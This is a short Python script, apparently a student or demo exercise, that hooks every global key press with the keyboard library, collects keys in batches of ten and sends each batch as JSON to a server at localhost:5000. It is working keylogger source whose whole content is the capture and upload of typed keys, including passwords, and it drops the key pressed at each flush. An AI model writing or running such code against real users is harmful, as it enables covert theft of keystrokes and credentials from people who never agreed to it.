import keyboard
import requests

last10 = []


def on_key_press(event):
    if len(last10) == 10:
        response = requests.post('http://localhost:5000/data', json={'key': last10 })
        last10.clear()
    else:
        print(f'Pritisnjena tipka: {event.name}')
        last10.append(event.name)
        print(last10)
        
keyboard.on_press(on_key_press)
keyboard.wait('esc')